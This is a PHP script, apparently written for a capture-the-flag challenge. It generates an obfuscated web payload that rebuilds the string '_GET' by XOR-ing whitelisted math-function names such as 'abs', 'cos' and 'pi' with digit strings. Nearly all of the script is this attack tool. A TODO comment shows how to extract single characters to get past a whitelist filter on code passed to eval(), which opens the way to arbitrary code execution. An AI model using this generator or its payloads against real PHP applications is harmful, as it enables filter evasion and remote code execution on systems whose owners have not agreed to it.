<?php // php < 8

/* TODO:
    Select each charater with {}
    Example: 
        function amosus_func($n) {
            return "no amorbus $n plz :>";
        }
        _GET: (is_prime^((6).(4))).(is_prime^(0).(6)){1}.(amosus_func^(10).(15)){3}
*/

$len_func = 0;

function bin2parenthesis($text) {
    $res = '(' . $text[0] .')';
    if (strlen($text) > 1) 
        $res .= '.(' . substr($text, 1). ')';
    return $res;
}

function find_xorstr($func, $i, $j) {
    global $len_func, $len_pattern;
    if ($i >= $len_func || $j >= $len_pattern)
        return '';

    global $pattern;
    $xorstr = $func[$i] ^ $pattern[$j];
    
    if (is_numeric($xorstr))
        return $xorstr . find_xorstr($func, $i + 1, $j + 1);
    
    return '';
}

function bin2xorstr($pattern, $depth, $final_depth) {
    global $whitelist;

    foreach ($whitelist as $func) {
        global $len_func;
        $len_func = strlen($func);

        $xorstr = find_xorstr($func, 0, $depth);
        $len_xorstr = strlen($xorstr);

        if ($len_xorstr > 1) {  // len of each piece in final payload
            $tmp = bin2xorstr($pattern, $depth + $len_xorstr, $final_depth);

            if ($depth + $len_xorstr + $tmp[1] === $final_depth) {
                $payload = '(' . $func . '^' . bin2parenthesis($xorstr) . ')';

                if ($tmp[1])
                    $payload .= '.';

                return [$payload . $tmp[0], $len_xorstr + $tmp[1]];
            }
        }
    }
    return [NULL, 0];
}

$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; 
$pattern = '_GET';

$len_pattern = strlen($pattern);
echo bin2xorstr($pattern, 0, $len_pattern)[0] . PHP_EOL;